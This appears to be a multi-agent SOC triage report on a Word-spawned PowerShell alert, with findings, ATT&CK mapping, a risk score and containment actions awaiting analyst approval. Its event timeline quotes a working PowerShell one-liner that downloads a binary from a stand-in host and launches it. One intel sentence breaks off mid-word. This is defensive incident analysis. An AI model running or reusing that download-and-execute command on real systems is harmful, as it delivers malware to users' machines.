# Triage report: alt_0001, Office application spawned PowerShell

## Summary

WINWORD.EXE spawned PowerShell that executed an encoded command to download a malicious payload from http://invoice-portal.example, which was written to %APPDATA%\Microsoft\msupdate.exe and launched as a child process (F1‑F3). The activity included DNS resolution for invoice-portal.example (F4) and an outbound HTTP connection to 203.0.113.116:80 (F5), with no persistence mechanisms established (F7). Verdict: malicious, confidence 0.97, risk score 75.

## Alert

| Field | Value |
| --- | --- |
| Rule | Office application spawned PowerShell |
| Severity | high |
| Time | 2026-10-06T09:55:12Z |
| Host | FIN-WS-02 |
| User | ben.r |
| Trigger events | evt_004047 |

## Triage decision

**P2, endpoint.** Office app spawned PowerShell with an encoded command that downloads and executes a binary—indicative of a likely malicious activity.

Investigator budget: P2 from Sentinel-Triage: 10 tool calls. Calls used: 7.

## Agent trail

| Stage | Model | LLM calls | Tool calls | Duration | Output |
| --- | --- | --- | --- | --- | --- |
| Sentinel-Triage | openai/gpt-oss-20b | 1 | 1 | 5.1 s | P2 endpoint |
| CyberIntel-Agent | openai/gpt-oss-20b | 2 | 15 | 2.4 s | 4 indicators, 2 known_bad |
| Investigator-Agent | openai/gpt-oss-120b | 13 | 13 | 326.3 s | 8 findings |
| Reviewer-Agent | openai/gpt-oss-120b | 4 | 5 | 166.4 s | 6 confirmed, 2 disputed |
| Report & Human Review | openai/gpt-oss-20b, openai/gpt-oss-120b | 4 | 0 | 25.4 s | malicious, risk 75, 2 techniques, 5 actions |

Tool calls are the tools that ran, code lookups included; a repeat answered from the ledger isn't one. Duration is the time between handoffs, so it includes waiting for rate limits, and a reopen adds to it.

## Intel brief

The alert shows a legitimate Office process (WINWORD.EXE) launching PowerShell with an encoded command that downloads and runs a binary from a known‑bad domain; the child msupdate.exe is unsigned and flagged as a commodity loader, indicating malicious activity rather than a benign update. However, t

| Role | Process | Signer | Reputation | Event |
| --- | --- | --- | --- | --- |
| parent | WINWORD.EXE | Microsoft Corporation | known_good | evt_004043 |
| trigger | powershell.exe | Microsoft Windows | known_good | evt_004047 |
| child | msupdate.exe | unsigned | known_bad | evt_004052 |

Indicators looked up:

- `invoice-portal.example`: known_bad (Malware distribution domain (phishing kit))
- `4632c077f61d2eccf9502b552a3e4b47918b77ef52faa49a97cb54e9fcbcefe7`: known_good (Signed system or vendor binary (powershell.exe))
- `10690ecba328f4a4147dea539d9e4c9f28a8da25b8475bbd0c86e8b535673c06`: known_good (Signed system or vendor binary (WINWORD.EXE))
- `acd149ab7c221ef664ba5d22c23d791ad13b800dc6de841c0bb78fe59f34a047`: known_bad (Commodity loader)

Injection scan: 0 flags across 181 texts (regex + classifier).

## Key event timeline

| Time (UTC) | Event | Type | Anomaly | Process | Parent | Target |
| --- | --- | --- | --- | --- | --- | --- |
| 2026-10-06T09:55:10Z | evt_004047 | process_start | 100.0 | powershell.exe | WINWORD.EXE | $u='http://invoice-portal.example/dl/update.bin';$p="$env:APPDATA\Microsoft\msupdate.exe";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p |
| 2026-10-06T09:55:16Z | evt_004052 | process_start | 100.0 | msupdate.exe | powershell.exe | "C:\Users\ben.r\AppData\Roaming\Microsoft\msupdate.exe" |

Anomaly is the event's score_anomaly percentile among baseline events of the same type, blank if no agent scored it. It measures how unusual an event is, not whether it is malicious.

## Findings

| ID | Status | Finding | Evidence |
| --- | --- | --- | --- |
| F1 | confirmed | WINWORD.EXE (known good) spawned powershell.exe with an encoded command line | evt_004047 |
| F2 | confirmed | The encoded PowerShell command downloaded http://invoice-portal.example/dl/update.bin and wrote it to %APPDATA%\Microsoft\msupdate.exe | evt_004047 |
| F3 | confirmed | msupdate.exe (hash acd149ab7c221ef664ba5d22c23d791ad13b800dc6de841c0bb78fe59f34a047, known bad) was started as a child of the PowerShell process | evt_004052 |
| F4 | confirmed | A DNS query for invoice-portal.example was issued by powershell.exe (pid 9396) | tool:get_dns_queries#25 |
| F5 | confirmed | powershell.exe made an outbound HTTP connection to 203.0.113.116:80 to retrieve the payload | tool:get_network_connections#27 |
| F7 | confirmed | No persistence artifacts (scheduled tasks, registry run keys, services) were created on the host | tool:get_persistence_events#28 |


2 disputed finding(s) were left out.

## ATT&CK mapping

| Technique | Tactics | Evidence | Rationale |
| --- | --- | --- | --- |
| [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/) | Execution | evt_004047, evt_004052 | Winword.exe spawned powershell.exe, indicating execution via the PowerShell command‑and‑scripting interpreter. |
| [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | Command and Control | evt_004047 | The encoded PowerShell command downloaded a file from a remote URL and wrote it to the local filesystem, demonstrating ingress tool transfer. |

## Verdict and risk

**Verdict: malicious** (confidence 0.97).
Confirmed findings show PowerShell downloaded a payload from the known‑bad domain invoice-portal.example (F2, F4) and executed a binary with a known‑bad hash (F3). The outbound HTTP connection (F5) and the use of an encoded command (F1) further indicate malicious behavior.

**Risk score: 75 / 100**

| Part | Input | Points |
| --- | --- | --- |
| Verdict x (0.5 + 0.5 x confidence) | malicious, 0.97 | 59.1 |
| Triage priority | P2 | 10 |
| Asset criticality | 3 | 6 |
| High-impact tactics | none | 0 |

Formula: verdict base x (0.5 + 0.5 x confidence) + priority points + (criticality - 1) x 3 + 8 per high-impact tactic (at most 16), clamped to 0-100, at most 20 if benign.

## Recommended actions pending analyst approval

Nothing has been executed.

| ID | Action | Target | Reason | Analyst decision |
| --- | --- | --- | --- | --- |
| A1 | isolate_host | FIN-WS-02 | The host executed a malicious PowerShell payload and downloaded a known-bad executable, indicating active compromise. | pending |
| A2 | collect_forensics | FIN-WS-02 | To preserve evidence of the attack chain, including the encoded command, downloaded binary, and network activity. | pending |
| A3 | block_indicator | 203.0.113.116 | Outbound HTTP connection to this IP was used to retrieve the malicious payload. | pending |
| A4 | block_indicator | invoice-portal.example | DNS query to this domain was used to locate the malicious download. | pending |
| A5 | block_indicator | acd149ab7c221ef664ba5d22c23d791ad13b800dc6de841c0bb78fe59f34a047 | The downloaded executable has a known bad hash. | pending |

## Analyst decision

Pending. The analyst has not recorded a verdict decision yet.

## Limitations

- The agent recommends and a human decides; nothing in this report was executed.
- Code refuses a benign verdict if any indicator in the case is known_bad or any log text has an injection flag, and requires a confirmed finding tied to the trigger, its parent or children, or an entity in the intel brief. It cannot check that the finding really supports the harmless explanation: the model picks which finding counts.
- Citation checks confirm that an event involves the entity named and that the acting process matches. They cannot confirm every other detail of a claim.
